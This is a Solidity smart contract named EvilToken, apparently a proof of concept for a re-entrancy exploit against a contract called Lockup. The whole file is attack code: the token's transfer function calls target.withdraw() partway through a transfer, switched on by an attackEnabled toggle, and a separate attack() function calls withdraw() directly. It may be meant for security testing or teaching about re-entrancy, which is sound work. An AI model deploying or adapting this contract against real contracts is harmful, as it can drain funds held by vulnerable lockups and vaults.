// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Lockup.sol";

contract EvilToken {
    string public name = "EvilToken";
    string public symbol = "EVL";
    uint8 public decimals = 18;

    mapping(address => uint256) private balances;

    Lockup public target;

    bool public attackEnabled;   // ✅ toggle
    bool internal attacking;

    constructor() {
        balances[msg.sender] = 1_000_000 ether;
    }

function attack() external {
    target.withdraw();
}

    function balanceOf(address account) external view returns (uint256) {
        return balances[account];
    }

    function setTarget(address _target) external {
        target = Lockup(_target);
    }

    function setAttack(bool _enabled) external {
        attackEnabled = _enabled;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balances[msg.sender] >= amount, "not enough");

        // normal transfer
        balances[msg.sender] -= amount;
        balances[to] += amount;

        // ONLY attack when enabled
        if (attackEnabled && !attacking && address(target) != address(0)) {
            attacking = true;

            target.withdraw();

            attacking = false;
        }

        return true;
    }
}
